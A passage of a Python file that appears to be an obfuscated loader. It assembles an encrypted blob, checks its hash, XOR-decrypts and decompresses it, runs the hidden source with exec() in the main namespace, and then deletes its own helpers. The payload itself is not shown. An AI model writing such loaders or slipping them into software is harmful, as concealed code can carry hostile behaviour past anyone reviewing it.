_cvifSQApmM0NSA + _cgHl4kYlRmYNfG + _ckfzQucyJiar12 + _cqF0ZNHA3HcrzJ + _cggAC2H2kizrCh + _cmkGKHhoSFuiIr + _cl4JCwmmGKc4Lb + _chnml8SUcYz8qz + _c_VWAkiOqAcUa7 + _cymBCBhZzVxWcn + _cq0FB1UuIc7fJ8 + _cuRysUkVrTa5qQ + _ceeIz1NZj7PXim + _c_ijLFDC_pZKdy + _ctFYEszyaBzrq_ + _chGxKfhBHTcVzg + _czkKi7FAhcq6AI + _cx9QYuEA2Oi0Af + _cs1jmvHV7giB5M + _chmnQn7G8lHOr_ + _cnQCkHclFakmg_ + _cxSGsVMRTQv8m4 + _cuV7iqHyqxzItu + _cmVu5HnSCy9ubB + _c_gIpI9iZgNFHm + _c_FFwLM5JofDBr + _cmPQeg_dcznbIW + _ce6UPKtp0nWJ9N + _chWQoUt7ElLrCK)
if __import__('hashlib').sha256(_pal8mJPtpwJPxk).hexdigest() != '8023860427685ba80e8343aefd45393318972b10ba9579ebdefe7d364ffce879':
    __import__('sys').exit(1)
_xiqU5gFKkdIaOi = bytes([235, 154, 183, 5, 211, 174, 172, 3, 13, 184, 225, 72, 39, 231, 35, 201, 183, 57, 155, 40, 5, 93, 139, 107, 84, 154, 191, 135, 115, 69, 62, 134])
_fkoYmOeT2vRrT3I = bytes([61, 9, 224, 253, 194, 10, 138, 79, 25, 186, 216, 218, 36, 135, 102, 171, 51, 97, 239, 122, 167, 73, 71, 237, 223, 234, 205, 193, 206, 148, 202, 181])

def _fxyk9DfssEgqzeB(_beBrdAVHUkA6HO, _kzqFIqeTEu7qZ8):
    return bytes(_beBrdAVHUkA6HO[_idNmZBUJ2c9f9b] ^ _kzqFIqeTEu7qZ8[_idNmZBUJ2c9f9b % len(_kzqFIqeTEu7qZ8)] for _idNmZBUJ2c9f9b in range(len(_beBrdAVHUkA6HO)))

def _fdesJSX1ubcF0tm(_talTNbWnp05WqJ):
    import zlib
    return zlib.decompress(_talTNbWnp05WqJ) # Un seul niveau de zlib ici pour simplifier

def _fechyOfNUXyVtFw():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xgsj1WnsTtrPr1 = _fxyk9DfssEgqzeB(_pal8mJPtpwJPxk, _xiqU5gFKkdIaOi)
    # 2. Décompression Zlib
    _dwLR6WNKBy0hP8 = _fdesJSX1ubcF0tm(_xgsj1WnsTtrPr1)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dwLR6WNKBy0hP8.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _niV2t65phfWAgr = _main.__dict__
    _niV2t65phfWAgr.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _niV2t65phfWAgr)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fechyOfNUXyVtFw()
try:
    del _fxyk9DfssEgqzeB, _fdesJSX1ubcF0tm, _fechyOfNUXyVtFw
    del _pal8mJPtpwJPxk, _xiqU5gFKkdIaOi, _fkoYmOeT2vRrT3I
except:
    pass
